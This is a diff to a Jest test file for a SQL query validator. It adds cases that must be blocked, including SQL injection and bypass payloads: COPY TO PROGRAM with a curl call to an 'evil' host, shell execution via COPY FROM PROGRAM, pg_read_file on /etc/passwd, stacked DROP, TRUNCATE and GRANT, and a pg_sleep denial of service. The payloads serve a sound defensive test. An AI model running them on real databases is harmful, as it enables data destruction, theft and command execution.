@@ -520,7 +520,8 @@ describe('SecurityManager', () => {
     test('should reject query with dangerous patterns', () => {
       const result = nonSelectManager.validateAnyQuery('SELECT * FROM users; DROP TABLE users');
       expect(result.allowed).toBe(false);
-      expect(result.reason).toContain('dangerous patterns');
+      // Stacked statements are now rejected outright (before dangerous-pattern analysis).
+      expect(result.reason).toMatch(/Multiple SQL statements|dangerous/i);
     });
 
     test('should reject query exceeding complexity score', () => {
@@ -594,13 +595,44 @@ describe('SecurityManager', () => {
     });
   });
 
+  describe('SELECT-only bypass protections', () => {
+    const cases: Array<[string, string]> = [
+      ['data-modifying CTE', 'WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x'],
+      ['top-level WITH ... DELETE', 'WITH t AS (SELECT 1) DELETE FROM users'],
+      ['EXPLAIN ANALYZE writing DML', 'EXPLAIN ANALYZE INSERT INTO audit VALUES (1)'],
+      ['EXPLAIN ANALYZE (executes statement)', 'EXPLAIN ANALYZE SELECT * FROM users'],
+      ['COPY ... TO PROGRAM', "COPY (SELECT 1) TO PROGRAM 'curl http://evil'"],
+      ['COPY ... FROM PROGRAM', "COPY secrets FROM PROGRAM 'sh -c id'"],
+      ['SELECT ... INTO write', "SELECT * FROM users INTO OUTFILE '/tmp/x'"],
+      ['stacked TRUNCATE', 'SELECT 1; TRUNCATE TABLE users'],
+      ['stacked GRANT', 'SELECT 1; GRANT ALL ON DATABASE x TO evil'],
+      ['pg_sleep DoS', 'SELECT * FROM t WHERE id = pg_sleep(10)'],
+      ['pg_read_file exfiltration', "SELECT pg_read_file('/etc/passwd')"],
+    ];
+
+    test.each(cases)('blocks %s', (_label, query) => {
+      const result = securityManager.validateSelectOnlyQuery(query, 'postgresql');
+      expect(result.allowed).toBe(false);
+    });
+
+    test('still allows a legitimate SELECT with keyword-like identifiers', () => {
+      // Regression: "description" must not trip the dangerous-function SCRIPT matcher.
+      const result = securityManager.validateSelectOnlyQuery(
+        'SELECT description, last_update FROM products WHERE id = 1',
+        'postgresql'
+      );
+      expect(result.allowed).toBe(true);
+    });
+  });
+
   describe('Deep Validation - nested dangerous patterns', () => {
     test('should block SELECT INTO OUTFILE', async () => {
       const result = await securityManager.validateQuery(
         "SELECT * FROM users INTO OUTFILE '/tmp/data.csv'"
       );
       expect(result.allowed).toBe(false);
-      expect(result.reason).toContain('dangerous');
+      // Blocked by the embedded write-keyword scan (INTO) or dangerous-pattern check.
+      expect(result.reason).toMatch(/INTO|dangerous/i);
     });
 
     test('should block SELECT with LOAD_FILE', async () => {
@@ -679,7 +711,8 @@ describe('SecurityManager', () => {
     test('should detect semicolon DROP TABLE injection', () => {
       const result = nonSelectManager.validateAnyQuery('SELECT * FROM users; DROP TABLE users');
       expect(result.allowed).toBe(false);
-      expect(result.reason).toContain('dangerous patterns');
+      // Stacked statements are now rejected outright (before dangerous-pattern analysis).
+      expect(result.reason).toMatch(/Multiple SQL statements|dangerous/i);
     });
 
     test('should detect UNION SELECT NULL injection', () => {
